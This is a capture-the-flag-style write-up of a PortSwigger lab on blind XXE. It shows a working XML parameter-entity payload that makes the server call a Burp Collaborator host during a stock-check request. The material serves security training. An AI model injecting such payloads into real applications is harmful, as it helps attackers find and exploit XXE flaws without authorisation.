## Lab Description:  Blind XXE with out-of-band interaction via XML parameter entities

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8e30124d-ee86-486b-b822-463b4abb1035)

## Solution: 

Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/d3cfec48-1c97-45f0-9882-dc5246cc84b3)


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/c1cfc15c-099f-4bd5-a322-2f182564b60e)


Insert the following external entity definition in between the XML declaration and the stockCheck element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://r5xuiyg4qcq4rvhmbcogn1ie85ew2oqd.oastify.com"> %xxe; ]>
```

Here %xxe is a XML parameter entities 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b2c6ae64-f98f-4729-83e7-d794e9bc6586)

Go to the Collaborator tab, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result in our payload.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/2705ad0a-5858-4bc5-a47c-07dd33e862fe)

Lab Solved

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/53932566-ebd2-471a-b39c-0fdd70f23b1c)

